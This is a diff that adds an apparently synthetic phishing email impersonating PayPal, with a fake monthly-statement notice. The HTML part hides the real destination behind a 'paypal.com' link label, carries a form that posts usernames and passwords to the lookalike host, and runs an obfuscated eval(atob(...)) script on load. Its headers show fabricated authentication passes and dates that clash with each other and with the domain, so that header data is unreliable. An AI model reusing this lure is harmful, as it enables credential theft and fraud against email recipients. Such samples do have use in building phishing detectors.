@@ -1,0 +1,32 @@
+From: notice@secure-paypal.vercel.app
+To: victim57@example.com
+Subject: Monthly statement available [ref U5BA8DD]
+Date: Tue, 11 Mar 2002 16:24:00 -0500
+Message-ID: <phish-237-b062df47-a755-494c-9833-487daa65bc11@secure-paypal.vercel.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 25 Mar 2002 11:14:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 10 Mar 2002 19:51:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 09 Mar 2002 13:24:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 04 Mar 2002 10:18:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 19 Mar 2002 05:03:00 -0500
+Return-Path: <notice@secure-paypal.vercel.app>
+Reply-To: notice@secure-paypal.vercel.app
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=secure-paypal.vercel.app; dkim=pass header.d=secure-paypal.vercel.app; dmarc=pass header.from=secure-paypal.vercel.app
+Received-SPF: pass (mx.example.com: domain of notice@secure-paypal.vercel.app designates 192.0.2.57 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-paypal.vercel.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-237-c0ce6bcd"
+
+--bnd-p-237-c0ce6bcd
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://secure-paypal.vercel.app/statement/U5BA8DD
+
+Reference: U5BA8DD
+--bnd-p-237-c0ce6bcd
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://secure-paypal.vercel.app/statement/U5BA8DD<br/><br/>Reference: U5BA8DD</p><p><a href="http://secure-paypal.vercel.app/login">https://www.paypal.com/signin</a></p><form action="http://secure-paypal.vercel.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-237-c0ce6bcd--
